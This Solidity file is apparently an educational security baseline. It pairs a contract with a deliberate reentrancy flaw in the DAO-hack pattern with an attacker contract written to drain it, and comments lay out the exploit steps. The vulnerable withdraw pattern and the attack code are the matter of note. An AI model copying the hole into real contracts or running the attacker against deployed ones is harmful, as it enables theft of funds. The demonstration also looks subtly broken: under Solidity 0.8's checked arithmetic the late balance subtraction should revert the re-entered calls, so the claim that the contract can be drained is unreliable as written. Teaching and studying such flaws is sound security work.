// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**

- @title Reentrancy Vulnerable (THE DAO Pattern)
- @notice BASELINE: Classic reentrancy vulnerability
- @dev Score: 0/100 (vulnerable)
-
- ANTI-PATTERN: External call BEFORE state update
- This is the exact pattern from The DAO hack (2016, $60M loss)
-
- METADATA:
- - Category: security
- - Tier: core
- - Safe: false
- - Immunefi Level: 5 (Critical)
- - Historical Exploit: The DAO (2016)
- - Tags: ["vulnerable", "educational", "reentrancy"]
    */
    contract ReentrancyVulnerable {
    mapping(address => uint256) public balances;
        event Deposit(address indexed user, uint256 amount);
        event Withdrawal(address indexed user, uint256 amount);

        function deposit() public payable {
            balances[msg.sender] += msg.value;
            emit Deposit(msg.sender, msg.value);
        }

        /**
         * @notice VULNERABLE: External call before state update
         * @dev Attacker can re-enter and drain funds
         *
         * EXPLOIT FLOW:
         * 1. Attacker calls withdraw(1 ETH)
         * 2. Contract sends 1 ETH to attacker
         * 3. Attacker's receive() is triggered
         * 4. Attacker re-enters withdraw(1 ETH) BEFORE balance is updated
         * 5. Repeat until contract drained
         */
        function withdraw(uint256 amount) public {
            require(balances[msg.sender] >= amount, "Insufficient balance");

            // VULNERABILITY: External call BEFORE state update
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");

            // State update happens AFTER external call (TOO LATE)
            balances[msg.sender] -= amount;

            emit Withdrawal(msg.sender, amount);
        }

        receive() external payable {
            deposit();
        }
    }

/**

- @title Attacker Contract
- @notice Demonstrates exploitation of reentrancy vulnerability
  */
  contract ReentrancyAttacker {
  ReentrancyVulnerable public victim;
  uint256 public constant ATTACK_AMOUNT = 1 ether;
  address public owner;
      constructor(address _victim) {
          victim = ReentrancyVulnerable(_victim);
          owner = msg.sender;
      }

      function attack() external payable {
          require(msg.value >= ATTACK_AMOUNT, "Need at least 1 ETH");
          victim.deposit{value: ATTACK_AMOUNT}();
          victim.withdraw(ATTACK_AMOUNT);
      }

      receive() external payable {
          if (address(victim).balance >= ATTACK_AMOUNT) {
              victim.withdraw(ATTACK_AMOUNT);
          }
      }

      function withdraw() external {
          require(msg.sender == owner);
          payable(owner).transfer(address(this).balance);
      }
  }